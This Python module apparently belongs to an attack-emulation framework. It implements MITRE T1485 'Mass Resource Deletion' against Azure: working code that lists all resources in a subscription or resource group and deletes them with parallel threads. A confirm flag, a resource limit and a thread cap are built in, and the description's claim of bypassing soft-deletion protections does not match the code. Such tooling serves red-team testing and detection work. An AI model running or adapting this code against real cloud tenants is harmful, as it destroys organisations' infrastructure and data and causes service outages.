from ..base_technique import BaseTechnique, ExecutionStatus, MitreTechnique, AzureTRMTechnique, TechniqueNote, TechniqueReference
from ..technique_registry import TechniqueRegistry
from typing import Dict, Any, Tuple, List
from azure.mgmt.resource import ResourceManagementClient
from azure.core.exceptions import HttpResponseError
from core.azure.azure_access import AzureAccess
import concurrent.futures
import time

@TechniqueRegistry.register
class AzureMassResourceDeletion(BaseTechnique):
    def __init__(self):
        mitre_techniques = [
            MitreTechnique(
                technique_id="T1485",
                technique_name="Data Destruction",
                tactics=["Impact"],
                sub_technique_name=None
            )
        ]
        references = [
            TechniqueReference("Azure Resource Manager API Reference","https://learn.microsoft.com/en-us/rest/api/resources/resources/delete"),
            TechniqueReference("Azure Resource Manager resource group and resource deletion", "https://docs.azure.cn/en-us/azure-resource-manager/management/delete-resource-group?tabs=azure-python"),
            TechniqueReference("Understanding Azure Resource Management","https://learn.microsoft.com/en-us/azure/azure-resource-manager/management/overview")
        ]
        notes = [
            TechniqueNote("This technique permanently deletes resources and should only be used in controlled test environments"),
            TechniqueNote("Resource deletion can trigger alerts in security monitoring systems"),
            TechniqueNote("Some resources have deletion locks that may prevent this technique from succeeding"),
            TechniqueNote("Critical resources may have additional protection policies requiring additional authentication"),
            TechniqueNote("The 'wait_for_completion' parameter allows for synchronous deletion when set to True"),
            TechniqueNote("Using resource_type_filter can target specific resource categories")
        ]
        super().__init__(
            "Mass Resource Deletion", 
            "Performs destructive impact through mass deletion of Azure resources across a subscription or resource group. This technique exploits excessive delete permissions to systematically enumerate and delete multiple resources simultaneously, potentially causing significant service disruption and data loss. The technique implements multi-threaded parallel deletion to maximize impact speed and uses resource filtering to target specific resource types if desired. It can operate in both synchronous and asynchronous modes, with the ability to bypass certain soft-deletion protections. The technique is particularly dangerous when executed with high-privileged accounts as it can rapidly dismantle an organization's cloud infrastructure, causing widespread service outages and potential business disruption.",
            mitre_techniques,
            references=references,
            notes=notes
        )

    def _delete_resource(self, resource_client, resource_id: str, wait_for_completion: bool) -> Tuple[str, bool, str]:
        """Helper function to delete a single resource"""
        try:
            api_version = "2024-01-01"
            # Extract resource group and name from resource ID
            parts = resource_id.split('/')
            if len(parts) < 9:
                return resource_id, False, "Invalid resource ID format"
            
            # Delete the resource
            if wait_for_completion:
                resource_client.resources.begin_delete_by_id(resource_id, api_version).result()
            else:
                resource_client.resources.begin_delete_by_id(resource_id, api_version)
            
            return resource_id, True, "Successfully deleted"
        except HttpResponseError as e:
            if "CannotDeleteDueToDeleteProtection" in str(e):
                return resource_id, False, "Protected by deletion lock"
            elif "AuthorizationFailed" in str(e):
                return resource_id, False, "Insufficient permissions"
            else:
                return resource_id, False, str(e)
        except Exception as e:
            return resource_id, False, str(e)

    def execute(self, **kwargs: Any) -> Tuple[ExecutionStatus, Dict[str, Any]]:
        self.validate_parameters(kwargs)
        try:
            resource_group_name: str = kwargs.get("resource_group_name")
            max_resources: int = kwargs.get("max_resources", 10)  # Default limit to prevent unintended mass deletion
            resource_type_filter: str = kwargs.get("resource_type_filter")
            wait_for_completion: bool = kwargs.get("wait_for_completion", False)
            max_threads: int = kwargs.get("max_threads", 5)  # default to 5 threads
            confirm: bool = kwargs.get("confirm", False)
            
            # Validate parameters
            if confirm in ["", None]:
                confirm = False

            if max_resources in ["", None]:
                max_resources = 10  # Default limit to prevent unintended mass deletion
            
            if max_resources <= 0:
                max_resources = 10  # Reset to default if invalid

            if max_threads in ["", None]:
                max_threads = 5  # Reset to default if invalid
            
            if max_threads <= 0:
                max_threads = 5  # Reset to default if invalid
            else:
                max_threads = min(max_threads, 10) # Limit max parallelism

            if wait_for_completion in ["", None]:
                wait_for_completion = False  # Reset to default if invalid
            
            if not confirm:
                # Additional validation to avoid accidental deletion of resources
                return ExecutionStatus.FAILURE, {
                    "error": {"error": "Confirm risk message to execute technique"},
                    "message": {"error": "Confirm risk message to execute technique"}
                }
            
            # Get credential and subscription
            credential = AzureAccess.get_azure_auth_credential()
            current_sub_info = AzureAccess().get_current_subscription_info()
            subscription_id = current_sub_info.get("id")
            
            # Create clients
            resource_client = ResourceManagementClient(credential, subscription_id)
            
            # Collect resources to delete
            resources_to_delete = []
            deleted_resources = []
            failed_resources = []
            
            # Filter resources based on parameters
            if resource_group_name:
                # List resources in specific resource group
                resources = resource_client.resources.list_by_resource_group(resource_group_name)
            else:
                # List all resources in subscription
                resources = resource_client.resources.list()
            
            # Apply filters and limits
            count = 0
            for resource in resources:
                # Skip if limit reached
                if count >= max_resources:
                    break
                    
                # Apply resource type filter if specified
                if resource_type_filter and resource_type_filter.lower() not in resource.type.lower():
                    continue
                
                resources_to_delete.append(resource.id)
                count += 1
            
            if not resources_to_delete:
                return ExecutionStatus.SUCCESS, {
                    "message": "No resources found matching the criteria",
                    "value": {
                        "resources_found": 0,
                        "resources_deleted": 0,
                        "resources_failed": 0,
                        "deleted_resources": [],
                        "failed_resources": []
                    }
                }
            
            # Perform deletion using thread pool for parallel execution
            start_time = time.time()
            with concurrent.futures.ThreadPoolExecutor(max_workers=max_threads) as executor:
                # Submit deletion tasks
                future_to_resource = {
                    executor.submit(self._delete_resource, resource_client, resource_id, wait_for_completion): resource_id
                    for resource_id in resources_to_delete
                }
                
                # Process results as they complete
                for future in concurrent.futures.as_completed(future_to_resource):
                    resource_id, success, message = future.result()
                    if success:
                        deleted_resources.append({"resource_id": resource_id, "message": message})
                    else:
                        failed_resources.append({"resource_id": resource_id, "error": message})
            
            execution_time = time.time() - start_time
            
            # Return results
            return ExecutionStatus.SUCCESS, {
                "message": f"Deleted {len(deleted_resources)} of {len(resources_to_delete)} resources in {execution_time:.2f} seconds",
                "value": {
                    "resources_found": len(resources_to_delete),
                    "resources_deleted": len(deleted_resources),
                    "resources_failed": len(failed_resources),
                    "execution_time_seconds": execution_time,
                    "deleted_resources": deleted_resources,
                    "failed_resources": failed_resources
                }
            }
            
        except Exception as e:
            return ExecutionStatus.FAILURE, {
                "error": str(e),
                "message": "Failed to execute mass resource deletion"
            }

    def get_parameters(self) -> Dict[str, Dict[str, Any]]:
        return {
            "resource_group_name": {
                "type": "str", 
                "required": False, 
                "default": None, 
                "name": "Resource Group Name (empty for whole subscription)", 
                "input_field_type": "text"
            },
            "resource_type_filter": {
                "type": "str", 
                "required": False, 
                "default": None, 
                "name": "Resource Type Filter (e.g. 'storage' or 'compute')", 
                "input_field_type": "text"
            },
            "max_resources": {
                "type": "int", 
                "required": False, 
                "default": 10, 
                "name": "Maximum Resources to Delete", 
                "input_field_type": "number"
            },
            "wait_for_completion": {
                "type": "bool", 
                "required": False, 
                "default": False, 
                "name": "Wait for Delete Completion", 
                "input_field_type": "bool"
            },
            "max_threads": {
                "type": "int", 
                "required": False, 
                "default": 5, 
                "name": "Maximum Parallel Deletions (1-10)", 
                "input_field_type": "number"
            },
            "confirm": {
                "type": "bool", 
                "required": True, 
                "default": False, 
                "name": "I Understand Risk", 
                "input_field_type": "bool"
            }
        }